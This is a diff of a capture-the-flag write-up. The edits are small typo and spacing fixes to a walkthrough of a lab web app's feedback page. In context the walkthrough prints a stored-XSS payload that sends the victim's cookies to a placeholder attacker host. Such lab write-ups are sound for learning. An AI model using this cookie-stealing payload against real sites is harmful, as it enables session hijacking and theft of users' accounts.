@@ -10,7 +10,7 @@ theme: minima
 Can you read the flag at http://10.10.102.26:8080/flag.txt?
 
 ## Accessing http://10.10.102.26:8080
-There is home pageand one feedback page.
+There is home page and one feedback page.
 ![image](https://github.com/user-attachments/assets/b9cfa04d-081c-4b59-8fef-717107a3bba8)
 
 most likely we have to put our payload on the feedback page.
@@ -48,6 +48,7 @@ if __name__ == '__main__':
 
 ### Putting the payload
 ![image](https://github.com/user-attachments/assets/c841d029-aa28-4c46-84fc-7a22251ead9a)
+
 payload:
 ```
 <script>document.location='http://ATTACKER_IP:8000/xss?cookie=' + document.cookie</script>
@@ -75,6 +76,7 @@ click submit.
 
 ### output
 ![image](https://github.com/user-attachments/assets/43386fd9-82d9-4abf-8e81-105357d232e9)
+
 got the flag.
 
 
